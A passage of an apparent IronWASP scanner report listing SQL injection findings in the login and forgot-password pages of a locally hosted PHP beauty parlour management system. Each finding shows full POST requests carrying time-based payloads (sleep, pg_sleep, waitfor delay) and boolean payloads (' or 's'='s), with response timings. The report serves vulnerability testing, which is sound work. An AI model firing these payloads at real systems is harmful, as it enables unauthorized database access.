+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is &quot; and pg_sleep(5)--</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/index.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=yyyyy&amp;password=yyyyy&amp;login=<span class='hlg'>%22+and+pg_sleep(5)--</span><br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10490 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding5'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding4'>&lt;&lt;&lt;</a><a href='#finding6'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>username</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>username</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>&quot;);waitfor delay '0:0:5'--</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10488</span> milliseconds. Normally this particular request is processed at around </span>25</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is &quot;);waitfor delay '0:0:5'--</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/index.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=<span class='hlg'>%22)%3bwaitfor+delay+'0%3a0%3a5'--</span>&amp;password=aa&amp;login=Sign+In<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10488 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding6'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding5'>&lt;&lt;&lt;</a><a href='#finding7'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>contactno</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>contactno</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reasons:<br>
+<div class='reason'><div class='reason_title'>Reason 1:</div>
+IronWASP sent four payloads to the application with SQL code snippets in them.<br>Payload A - <span class='hlg'>aaxxx' or 's'='s</span><br>Payload B - <span class='hlg'>aaxxx' or 's'='r</span><br>Payload C - <span class='hlg'>aaxxx' or 't'='t</span><br>Payload D - <span class='hlg'>aaxxx' or 't'='r</span><br>Payload A and C have a boolean condition after the <span class='hlg'>OR</span> keyword that will evaluate to true. The boolean condition in Payload B and D would evaluate to false.<br>The response for Payload A and C were similar to each other and were different from the response received for Payload B and D. This indicates that the application was actually evaluating the boolean condition in the payloads. So since Payload A and C both has a true boolean condition their responses are similar, C and D had a false boolean condition.<br>If the application was not actually evaluating the boolean condition then all four payload should have returned very similar responses. Therefore this indicates that SQL syntax from the payload is executed as part of the SQL query on the server.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+Manually analyze the responses received for the four payloads and confirm if the type of similarity explained above actually exists in them. Try resending the same payloads again but with values in the boolean expression and check if this behaviour is repeated.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='s which evaluates to true. The payload is aaxxx' or 's'='s</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=aa&amp;contactno=<span class='hlg'>aaxxx'+or+'s'%3d's</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean true condition based payload. This response is equal to the response of the second boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='r which evaluates to false. The payload is aaxxx' or 's'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=aa&amp;contactno=<span class='hlg'>aaxxx'+or+'s'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean false condition based payload. This response is equal to the response of the second boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='t which evaluates to true. The payload is aaxxx' or 't'='t</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=aa&amp;contactno=<span class='hlg'>aaxxx'+or+'t'%3d't</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean true condition based payload. This response is equal to the response of the first boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='r which evaluates to false. The payload is aaxxx' or 't'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=aa&amp;contactno=<span class='hlg'>aaxxx'+or+'t'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean false condition based payload. This response is equal to the response of the first boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 2:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10055</span> milliseconds. Normally this particular request is processed at around </span>14</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=aa&amp;contactno=<span class='hlg'>'+or+sleep(5)%23</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10055 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 3:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)='</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10740</span> milliseconds. Normally this particular request is processed at around </span>14</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)='</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=aa&amp;contactno=<span class='hlg'>'+or+sleep(5)%3d'</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10740 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding7'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding6'>&lt;&lt;&lt;</a><a href='#finding8'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>email</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>email</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reasons:<br>
+<div class='reason'><div class='reason_title'>Reason 1:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10058</span> milliseconds. Normally this particular request is processed at around </span>30</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=<span class='hlg'>'+or+sleep(5)%23</span>&amp;contactno=ttttt&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10058 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 2:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)='</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10115</span> milliseconds. Normally this particular request is processed at around </span>30</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)='</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=<span class='hlg'>'+or+sleep(5)%3d'</span>&amp;contactno=ttttt&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10115 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding8'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding7'>&lt;&lt;&lt;</a><a href='#finding9'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>contactno</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>contactno</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reasons:<br>
+<div class='reason'><div class='reason_title'>Reason 1:</div>
+IronWASP sent four payloads to the application with SQL code snippets in them.<br>Payload A - <span class='hlg'>uuuuuxxx' or 's'='s</span><br>Payload B - <span class='hlg'>uuuuuxxx' or 's'='r</span><br>Payload C - <span class='hlg'>uuuuuxxx' or 't'='t</span><br>Payload D - <span class='hlg'>uuuuuxxx' or 't'='r</span><br>Payload A and C have a boolean condition after the <span class='hlg'>OR</span> keyword that will evaluate to true. The boolean condition in Payload B and D would evaluate to false.<br>The response for Payload A and C were similar to each other and were different from the response received for Payload B and D. This indicates that the application was actually evaluating the boolean condition in the payloads. So since Payload A and C both has a true boolean condition their responses are similar, C and D had a false boolean condition.<br>If the application was not actually evaluating the boolean condition then all four payload should have returned very similar responses. Therefore this indicates that SQL syntax from the payload is executed as part of the SQL query on the server.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+Manually analyze the responses received for the four payloads and confirm if the type of similarity explained above actually exists in them. Try resending the same payloads again but with values in the boolean expression and check if this behaviour is repeated.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='s which evaluates to true. The payload is uuuuuxxx' or 's'='s</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=uuuuu&amp;contactno=<span class='hlg'>uuuuuxxx'+or+'s'%3d's</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean true condition based payload. This response is equal to the response of the second boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='r which evaluates to false. The payload is uuuuuxxx' or 's'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=uuuuu&amp;contactno=<span class='hlg'>uuuuuxxx'+or+'s'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean false condition based payload. This response is equal to the response of the second boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='t which evaluates to true. The payload is uuuuuxxx' or 't'='t</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=uuuuu&amp;contactno=<span class='hlg'>uuuuuxxx'+or+'t'%3d't</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean true condition based payload. This response is equal to the response of the first boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='r which evaluates to false. The payload is uuuuuxxx' or 't'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=uuuuu&amp;contactno=<span class='hlg'>uuuuuxxx'+or+'t'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean false condition based payload. This response is equal to the response of the first boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 2:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10488</span> milliseconds. Normally this particular request is processed at around </span>6</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=uuuuu&amp;contactno=<span class='hlg'>'+or+sleep(5)%23</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10488 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 3:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)='</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10125</span> milliseconds. Normally this particular request is processed at around </span>6</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)='</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=uuuuu&amp;contactno=<span class='hlg'>'+or+sleep(5)%3d'</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10125 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding9'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding8'>&lt;&lt;&lt;</a><a href='#finding10'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
